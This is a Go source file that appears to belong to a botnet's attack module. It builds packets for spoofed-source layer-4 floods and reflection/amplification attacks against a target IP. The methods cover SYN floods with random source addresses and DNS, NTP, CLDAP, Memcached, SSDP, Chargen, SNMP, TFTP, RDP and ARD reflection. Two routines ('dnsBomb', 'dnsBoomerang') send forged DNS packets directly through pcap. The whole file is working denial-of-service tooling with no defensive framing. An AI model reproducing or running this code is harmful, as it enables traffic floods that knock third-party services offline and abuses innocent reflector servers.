package attack

import (
	"bot/packetbuilder/protocol"
	"fmt"
	"time"

	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// Layer4 struct to store attack-related information
type Layer4 struct {
	Method string // Attack method

	SrcIP   string // Source IP, if empty, use local IP
	SrcPort int    // Source port, if empty, randomly select a port
	DstIP   string // Destination IP, if empty, look up server file
	DstPort int    // Destination port, if empty, use protocol's default port

	ThreadCount int    // Number of attack threads
	AmpFile     string // Path to server file for amplification

	Reservedfield string // Reserved field for additional information in amplification attacks
}

func (l *Layer4) udpPacket() ([][]byte, error) {
	var packets [][]byte

	if l.SrcIP == "" {
		// Send packets without spoofing IP
		_, srcip, err := protocol.FindInterface(l.DstIP)
		if err != nil {
			return nil, fmt.Errorf("Failed to generate UDP packet: %v", err)
		}
		srcport := RandPort()
		udppacket, err := protocol.UDPPacket(srcip, l.DstIP, srcport, l.DstPort)
		packets = append(packets, udppacket)
	} else {
		// Generate a single packet with a specified source address
		udppacket, err := protocol.UDPPacket(l.SrcIP, l.DstIP, l.SrcPort, l.DstPort)
		if err != nil {
			return nil, fmt.Errorf("Failed to generate UDP packet: %v", err)
		}
		packets = append(packets, udppacket)
	}

	return packets, nil
}

func (l *Layer4) synPacket() ([][]byte, error) {
	var packets [][]byte

	if l.SrcIP == "" {
		for i := 0; i < 1000; i++ {
			synpacket, err := protocol.SYNPacket(RandIPv4(), l.DstIP, RandPort(), l.DstPort)
			if err != nil {
				return nil, fmt.Errorf("Failed to generate SYN packet: %v", err)
			}
			packets = append(packets, synpacket)
		}
	} else {
		ampList, err := protocol.LoadIPList(l.AmpFile)
		if err != nil {
			return nil, fmt.Errorf("Failed to load server file: %v", err)
		}
		for _, refip := range ampList {
			synpacket, err := protocol.SYNPacket(l.DstIP, refip, l.DstPort, 80)
			if err != nil {
				return nil, fmt.Errorf("Failed to construct SYN packet: %v", err)
			}
			packets = append(packets, synpacket)
		}
	}

	return packets, nil
}

func (l *Layer4) dnsaPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("Failed to load server file: %v", err)
	}

	dns := protocol.DNSQuery()
	dns.Questions[0].Name = []byte(l.Reservedfield)
	for _, refip := range ampList {
		dnspacket, err := protocol.DNSPacket(l.DstIP, refip, l.DstPort, 53, dns)
		if err != nil {
			return nil, fmt.Errorf("Failed to construct DNS packet: %v", err)
		}
		packets = append(packets, dnspacket)
	}

	return packets, nil
}

func (l *Layer4) dnsnsPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("Failed to load server file: %v", err)
	}

	dns := protocol.DNSQuery()
	dns.Questions[0].Name = []byte(l.Reservedfield)
	dns.Questions[0].Type = layers.DNSTypeNS
	for _, refip := range ampList {
		dnspacket, err := protocol.DNSPacket(l.DstIP, refip, l.DstPort, 53, dns)
		if err != nil {
			return nil, fmt.Errorf("Failed to construct DNS packet: %v", err)
		}
		packets = append(packets, dnspacket)
	}

	return packets, nil
}

func (l *Layer4) rdpPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("Failed to load server file: %v", err)
	}

	for _, refip := range ampList {
		rdppacket, err := protocol.RDPPacket(l.DstIP, refip, l.DstPort, 3389)
		if err != nil {
			return nil, fmt.Errorf("Failed to construct RDP packet: %v", err)
		}
		packets = append(packets, rdppacket)
	}

	return packets, nil
}

func (l *Layer4) cldapPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("Failed to load server file: %v", err)
	}

	for _, refip := range ampList {
		cldappacket, err := protocol.CLDAPPacket(l.DstIP, refip, l.DstPort, 389)
		if err != nil {
			return nil, fmt.Errorf("Failed to construct CLDAP packet: %v", err)
		}
		packets = append(packets, cldappacket)
	}

	return packets, nil
}

func (l *Layer4) memcachedPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("Failed to load server file: %v", err)
	}

	for _, refip := range ampList {
		memcachedpacket, err := protocol.MEMCACHEDPacket(l.DstIP, refip, l.DstPort, 11211)
		if err != nil {
			return nil, fmt.Errorf("Failed to construct Memcached packet: %v", err)
		}
		packets = append(packets, memcachedpacket)
	}

	return packets, nil
}

func (l *Layer4) ardPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("Failed to load server file: %v", err)
	}

	for _, refip := range ampList {
		ardpacket, err := protocol.ARDPacket(l.DstIP, refip, l.DstPort, 3283)
		if err != nil {
			return nil, fmt.Errorf("Failed to construct ARD packet: %v", err)
		}
		packets = append(packets, ardpacket)
	}

	return packets, nil
}

func (l *Layer4) ntpPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("Failed to load server file: %v", err)
	}

	for _, refip := range ampList {
		ntppacket, err := protocol.NTPPacket(l.DstIP, refip, l.DstPort, 123)
		if err != nil {
			return nil, fmt.Errorf("Failed to construct NTP packet: %v", err)
		}
		packets = append(packets, ntppacket)
	}

	return packets, nil
}

// Add corresponding attack methods in layer4.go (attack/layer4.go)
func (l *Layer4) ssdpPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("Failed to load SSDP server list: %v", err)
	}

	for _, refip := range ampList {
		pkt, err := protocol.SSDPPacket(l.DstIP, refip, l.DstPort, 1900)
		if err != nil {
			return nil, fmt.Errorf("Failed to construct SSDP packet: %v", err)
		}
		packets = append(packets, pkt)
	}
	return packets, nil
}

func (l *Layer4) chargenPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("Failed to load Chargen server list: %v", err)
	}

	for _, refip := range ampList {
		pkt, err := protocol.ChargenPacket(l.DstIP, refip, l.DstPort, 19)
		if err != nil {
			return nil, fmt.Errorf("Failed to construct Chargen packet: %v", err)
		}
		packets = append(packets, pkt)
	}
	return packets, nil
}

func (l *Layer4) snmpPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("Failed to load SNMP server list: %v", err)
	}

	for _, refip := range ampList {
		pkt, err := protocol.SNMPPacket(l.DstIP, refip, l.DstPort, 161)
		if err != nil {
			return nil, fmt.Errorf("Failed to construct SNMP packet: %v", err)
		}
		packets = append(packets, pkt)
	}
	return packets, nil
}

func (l *Layer4) openvpnPacket() ([][]byte, error) {
	var packets [][]byte
	for i := 0; i < 500; i++ { // Generate a large number of variant packets
		pkt, err := protocol.OpenVPNPacket(
			RandIPv4(),
			l.DstIP,
			RandPort(),
			1194,
		)
		if err != nil {
			return nil, fmt.Errorf("Failed to construct OpenVPN packet: %v", err)
		}
		packets = append(packets, pkt)
	}
	return packets, nil
}

func (l *Layer4) tftpPacket() ([][]byte, error) {
	var packets [][]byte
	ampList, err := protocol.LoadIPList(l.AmpFile)
	if err != nil {
		return nil, fmt.Errorf("Failed to load TFTP server list: %v", err)
	}

	for _, refip := range ampList {
		pkt, err := protocol.TFTPPacket(l.DstIP, refip, l.DstPort, 69)
		if err != nil {
			return nil, fmt.Errorf("Failed to construct TFTP packet: %v", err)
		}
		packets = append(packets, pkt)
	}
	return packets, nil
}

func (l *Layer4) dnsBomb() ([][]byte, error) {
	resolver, err := protocol.LoadIPList("./serverfile/resolver.txt")
	if err != nil {
		return nil, nil
	}

	interfaceName, _, err := protocol.FindInterface(resolver[0])
	if err != nil {
		fmt.Printf("No available network interface: %v\n", err)
		return nil, nil
	}

	handle, err := pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		fmt.Printf("Failed to open device: %v\n", err)
		return nil, nil
	}
	defer handle.Close()

	// Send packets for 14 seconds, as timeout is set to 15 seconds
	tmp := time.Now().Add(14 * time.Second)
	for time.Now().Before(tmp) {
		query := protocol.DNSQuery()

		packet, err := protocol.DNSPacket(l.DstIP, resolver[0], l.DstPort, 53, query)
		if err != nil {
			return nil, nil
		}

		if err := handle.WritePacketData(packet); err != nil {
			fmt.Printf("Failed to send forged packet: %v\n", err)
			return nil, nil
		}

	}

	return nil, nil
}

// Target is a DNS resolver, resolver IPs are stored in the server file
func (l *Layer4) dnsBoomerang() ([][]byte, error) {
	resolver, err := protocol.LoadIPList("./serverfile/resolver.txt")
	if err != nil {
		return nil, nil
	}

	interfaceName, _, err := protocol.FindInterface(resolver[0])
	if err != nil {
		fmt.Printf("No available network interface: %v\n", err)
		return nil, nil
	}

	handle, err := pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		fmt.Printf("Failed to open device: %v\n", err)
		return nil, nil
	}
	defer handle.Close()

	// Second-layer reflector, reflector IP is used as source IP
	ampList, err := protocol.LoadIPList("./serverfile/reflector.txt")
	if err != nil {
		return nil, nil
	}
	// Send packets for 14 seconds, as timeout is set to 15 seconds
	tmp := time.Now().Add(14 * time.Second)
	for time.Now().Before(tmp) {
		for _, ip := range ampList {
			query := protocol.DNSQuery()

			packet, err := protocol.DNSPacket(ip, resolver[0], 53, 53, query)
			if err != nil {
				return nil, nil
			}

			fmt.Println("Source IP:", ip)
			fmt.Println("Destination IP:", resolver[0])

			if err := handle.WritePacketData(packet); err != nil {
				fmt.Printf("Failed to send forged packet: %v\n", err)
				return nil, nil
			}

		}
	}

	return nil, nil
}
